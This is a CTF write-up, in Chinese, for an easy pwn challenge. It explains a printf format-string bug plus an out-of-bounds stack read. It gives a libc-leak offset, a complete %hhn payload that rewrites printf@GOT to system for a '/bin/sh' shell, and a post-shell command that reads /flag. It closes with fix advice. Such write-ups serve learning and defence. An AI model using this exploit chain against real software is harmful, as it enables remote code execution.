# huge binary 1 — Writeup

**Flag**: `K17{it's_ab0v3_aver@ge_actua1ly}`
**Category**: pwn · easy · 111 pts
**Target**: `nc chal.secso.cc 4002`
**Exploit**: `exploit.py`

## TL;DR

`printf` 的**格式串完全可控**（两个 128 字节栈 buffer 各来一次），且二进制
**非 PIE、GOT 可写**，于是不需要 ROP：

1. 用 `"Enter an index"` 的 OOB 栈读，把 `*(rbp+8)`（即 `main` 的返回地址）读出来，
   `- 0x29ca8` 得到 libc 基址；
2. 用脏格式串把 `printf@got` 六个有效字节逐字节改写成 `system`；
3. `buf2` 头 8 字节放 `"/bin/sh\0"` —— `main` 在第二次 `printf(buf2)` 前正好把
   `rdi = buf2`，GOT 已经变成 `system`，直接就是 `system("/bin/sh")`。

```
$ python3 exploit.py
[+] leak      = 0x7f7a038caca8
[+] libc base = 0x7f7a038a1000
[+] system    = 0x7f7a038f4110
[+] printf@got -> system, shell is up
[+] FLAG: K17{it's_ab0v3_aver@ge_actua1ly}
```

## 漏洞

`main`（`0x401156`）的两次 echo 都是把用户输入当格式串直接丢给 `printf`：

```c
char buf1[128];   // rbp-0x90
char buf2[128];   // rbp-0x110

scanf("%d", &idx);
printf("Your lucky number is 0x%llx\n", *(unsigned long *)(rbp + idx*8 - 8));  // OOB 栈读
printf("Enter the first input to be echoed: ");
scanf("%127s", buf1);
printf("Enter the second input to be echoed: ");
scanf("%127s", buf2);
puts("Echoed output: ");
printf(buf1);            // <-- 格式串注入 1
printf(buf2);            // <-- 格式串注入 2
```

`%127s` 限了长度，所以溢出不是路子；真正的洞是 **format string + 非 PIE + GOT 可写**。

## 关键偏移

| 名称 | 值 | 说明 |
|------|-----|------|
| `LIBC_START_CALL_MAIN_RET` | `0x29ca8` | `__libc_start_call_main` 里 `call rax`（rax=main）的下一条指令，即 `main` 运行时的返回地址 |
| `SYSTEM_OFF` | `0x53110` | `system@@GLIBC_2.2.5`（Debian 13.4 glibc 2.41-12+deb13u2） |
| `PRINTF_GOT` | `0x403390` | `printf@GOT`，`.got.plt` 可写 |

泄漏点：`idx = 2` → `[rbp + 2*8 - 8] = [rbp+8]` = 返回地址。
（`printf("...0x%llx\n", rax)` 里 `%llx` 会把整个 8 字节打出来。）

## 栈参数映射（利用的核心）

`printf(buf1)` 执行时程序栈顶是 `rbp-0x120`，`call` 压入返回地址后，
**第 6 个 vararg 落在 `rbp-0x120`**，于是：

| 位置 | 地址 | 内容 |
|------|------|------|
| `%6$` | `rbp-0x120` | `argv` 残留 |
| `%7$` | `rbp-0x118` | `argc`/填充 |
| `%8$` | `rbp-0x110` | **`buf2[0:8]`** |
| `%9$` | `rbp-0x108` | **`buf2[8:16]`** |
| … | … | … |
| `%14$` | `rbp-0xe8` | `buf2[48:56]` |

也就是说 **`buf2` 自身既是 `"/bin/sh"` 字符串，又是「写哪儿」的指针数组**：

```
buf2 = "/bin/sh\0" | &printf@got | &printf@got+1 | ... | &printf@got+5
       %8$ (不用)      %9$           %10$               %14$
```

`buf1` 则是一串纯定位（positional）格式：

```
%1$3c %12$hhn %1$13c %9$hhn %1$49c %10$hhn %1$57c %13$hhn %1$5c %14$hhn %1$16c %11$hhn
```

- `%<k>$hhn` 把当前已输出字符数取低 8 位写进第 `k` 个参数指向的地址；
- `%1$Nc` 只用来把输出计数顶到目标字节值（`%c` 打印的是 `rsi` 的残留值，
  内容无所谓，**宽度才是我们要的**）；
- 字节按**数值升序**写，计数器只增不减，省掉 `%<大数>c` 的回绕 hack，
  最终格式串也短到 75 字节，稳过 128 上限。

六次写完之后 `printf@got == system`。紧接着 `main` 执行：

```asm
401281:  lea rax,[rbp-0x110]     ; rax = buf2
401288:  mov rdi,rax             ; rdi = "/bin/sh"
40128b:  mov eax,0x0
401290:  call printf@plt         ; == system("/bin/sh")
```

第一次 `printf(buf1)` 本身不会崩：GOT 是在**该函数已经进入之后**才被改的。

## 两个坑

- **`%1$hhn` 而不是 `%hhn`**：格式串里只要出现一个定位说明符，glibc 就要求
  **全部**说明符都定位；混用会直接打印出字面串，利用静默失败。
- **远端没有 tty**：拿到 shell 之后别指望交互。exploit 里一次性
  `sendall("id; cat /flag*; ls -la /")` 再用带超时的 `recvall` 把输出捞回来，
  并用正则 `(K17|SCONES)\{[^}]*\}` 抓 flag。（flag 在容器根目录 `/flag`，
  `Dockerfile` 里 `COPY flag /`，chroot 之后就是 `/flag`。）

## 复现

```sh
cd hb1
python3 exploit.py        # 一键：拿 shell、cat flag、打印
python3 exploit.py -i     # 可选：进交互式 shell
```

## 修复建议

- `printf("%s", buf)` / `fputs(buf, stdout)`，永远不要把用户输入当格式串。
- 顺手把 `printf("...%llx", *(rbp + idx*8 - 8))` 的越界索引也修掉 ——
  这道题里它把「需要 info leak 才能打」降成了「两行就能拿 libc」。
- 编译加 `-fPIE -pie` + `-Wl,-z,relro,-z,now`，让 GOT 不可写、地址不可预测，
  这类「改 GOT」利用链就断了。
